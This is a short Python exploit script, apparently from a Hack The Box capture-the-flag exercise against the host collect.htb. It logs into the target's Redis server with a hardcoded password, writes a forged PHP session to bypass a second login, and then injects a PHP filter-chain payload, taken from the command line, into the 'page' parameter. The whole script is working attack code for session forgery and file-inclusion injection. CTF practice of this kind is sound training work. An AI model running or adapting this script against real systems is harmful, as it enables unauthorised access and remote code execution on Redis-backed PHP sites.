import redis
import requests
import sys

url = 'http://developers.collect.htb/'
params = {'page':'home'}
cookie = {'PHPSESSID':'f2k1qko9ichlfa7gcprg6sletj'}
auth = ('developers_group','r0cket')
php_filter = "page="+ sys.argv[1]

r = redis.Redis(
	host='collect.htb',
	port=6379,
	password='COLLECTR3D1SPASS')

print('[+] logged to Redis')
print('[+] add redis to forged cookie')
r.set('PHPREDIS_SESSION:f2k1qko9ichlfa7gcprg6sletj','username|s:7:\"user911\";role|s:4:\"user\";auth|s:4:\"test\";')
res = requests.get(url=url,params=params,auth=auth,cookies=cookie)
if 'logout' in res.text:
	print('[+] sucessfully bypassed the second login with forged cookie')
else:
	print('failed to bypass')
print('[+] injecting php-filter chain on parameter page')
res = requests.get(url=url,params=php_filter,auth=auth,cookies=cookie)
print('[+] session closed',res.status_code)